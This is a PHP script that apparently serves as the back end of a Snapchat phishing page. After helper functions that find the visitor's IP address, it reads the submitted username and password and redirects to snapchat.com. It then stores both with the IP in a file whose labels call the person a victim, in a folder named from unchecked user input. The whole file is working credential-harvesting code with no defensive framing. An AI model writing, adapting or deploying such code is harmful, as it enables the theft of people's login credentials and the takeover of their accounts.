<?php

/*function getUserIpAddr(){
    if(!empty($_SERVER["HTTP_CLIENT_IP"])){
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    }
    elseif(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
    else{
        $ip = $_SERVER["REMOTE_ADDR"];
    }
    return $ip;
}*/

function get_ip_address() {

    // Check for shared Internet/ISP IP
    if (!empty($_SERVER['HTTP_CLIENT_IP']) && validate_ip($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }

    // Check for IP addresses passing through proxies
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {

        // Check if multiple IP addresses exist in var
        if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',') !== false) {
            $iplist = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($iplist as $ip) {
                if (validate_ip($ip))
                    return $ip;
            }
        }
        else {
            if (validate_ip($_SERVER['HTTP_X_FORWARDED_FOR']))
                return $_SERVER['HTTP_X_FORWARDED_FOR'];
        }
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED']) && validate_ip($_SERVER['HTTP_X_FORWARDED']))
        return $_SERVER['HTTP_X_FORWARDED'];
    if (!empty($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && validate_ip($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
        return $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_FORWARDED_FOR']) && validate_ip($_SERVER['HTTP_FORWARDED_FOR']))
        return $_SERVER['HTTP_FORWARDED_FOR'];
    if (!empty($_SERVER['HTTP_FORWARDED']) && validate_ip($_SERVER['HTTP_FORWARDED']))
        return $_SERVER['HTTP_FORWARDED'];

    // Return unreliable IP address since all else failed
    return $_SERVER['REMOTE_ADDR'];
}

/**
 * Ensures an IP address is both a valid IP address and does not fall within
 * a private network range.
 */
function validate_ip($ip) {

    if (strtolower($ip) === 'unknown')
        return false;

    // Generate IPv4 network address
    $ip = ip2long($ip);

    // If the IP address is set and not equivalent to 255.255.255.255
    if ($ip !== false && $ip !== -1) {
        // Make sure to get unsigned long representation of IP address
        // due to discrepancies between 32 and 64 bit OSes and
        // signed numbers (ints default to signed in PHP)
        $ip = sprintf('%u', $ip);

        // Do private network range checking
        if ($ip >= 0 && $ip <= 50331647)
            return false;
        if ($ip >= 167772160 && $ip <= 184549375)
            return false;
        if ($ip >= 2130706432 && $ip <= 2147483647)
            return false;
        if ($ip >= 2851995648 && $ip <= 2852061183)
            return false;
        if ($ip >= 2886729728 && $ip <= 2887778303)
            return false;
        if ($ip >= 3221225984 && $ip <= 3221226239)
            return false;
        if ($ip >= 3232235520 && $ip <= 3232301055)
            return false;
        if ($ip >= 4294967040)
            return false;
    }
    return true;
}
    header ("Location: https://snapchat.com");

    $usernameoremail = $_POST["username"];
    $pass = $_POST["password"];
    $ip = get_ip_address();
    echo $ip."<br>";
    $fichier = $usernameoremail;

    if (is_dir($usernameoremail)){
        echo "Le répertoire existe déjà et il sera écrasé pour de nouvelles données";
    }
    else {
        mkdir($usernameoremail);
        echo "Le répertoire à été créer!";
    }

    $repertoire = fopen($usernameoremail."/infos.html", "w");


    fwrite($repertoire, "<!DOCTYPE html><head><meta charset='utf-8'>");
    fwrite($repertoire, "Addresse Email de la victime 📮 : ".$usernameoremail."<br>");
    fwrite($repertoire, "Mot de passe de la victime 🔐 : ".$pass."<br>");
    fwrite($repertoire, "Addresse IP de la victime 🌆 : ".$ip."<br>");
?>